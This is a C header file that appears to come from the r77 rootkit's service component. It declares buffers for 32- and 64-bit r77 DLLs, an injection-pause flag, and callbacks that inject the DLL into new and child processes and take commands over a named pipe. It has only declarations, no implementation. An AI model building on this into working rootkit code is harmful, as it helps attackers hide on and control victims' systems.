#define CUSTOM_ENTRY
#include "r77mindef.h"

/// <summary>
/// The 32-bit r77 DLL.
/// </summary>
LPBYTE Dll32;
/// <summary>
/// The size of the 32-bit r77 DLL.
/// </summary>
DWORD Dll32Size;
/// <summary>
/// The 64-bit r77 DLL.
/// </summary>
LPBYTE Dll64;
/// <summary>
/// The size of the 64-bit r77 DLL.
/// </summary>
DWORD Dll64Size;
/// <summary>
/// Specifies whether to temporarily pause injection.
/// <para>This flag is related to the CONTROL_R77_PAUSE_INJECTION control code.</para>
/// </summary>
BOOL IsInjectionPaused;

/// <summary>
/// Callback for newly created child processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID ChildProcessCallback(DWORD processId);
/// <summary>
/// Callback for new processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID NewProcessCallback(DWORD processId);
/// <summary>
/// Callback for commands sent to the r77 service.
/// </summary>
/// <param name="controlCode">The control code of the command.</param>
/// <param name="pipe">A handle to the named pipe that contains data about the command.</param>
VOID ControlCallback(DWORD controlCode, HANDLE pipe);